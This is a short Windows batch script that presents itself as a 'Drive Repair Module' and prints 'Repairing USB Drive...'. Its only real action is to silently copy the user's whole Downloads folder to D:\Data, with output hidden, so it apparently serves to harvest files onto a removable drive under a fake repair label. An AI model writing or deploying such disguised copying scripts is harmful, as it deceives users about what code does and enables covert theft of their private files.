@echo off
title Drive Repair Module
echo Repairing USB Drive...
cmd /c "robocopy %USERPROFILE%/Downloads D:\Data /e /eta" >nul
timeout /t 1 /nobreak >nul
exit
 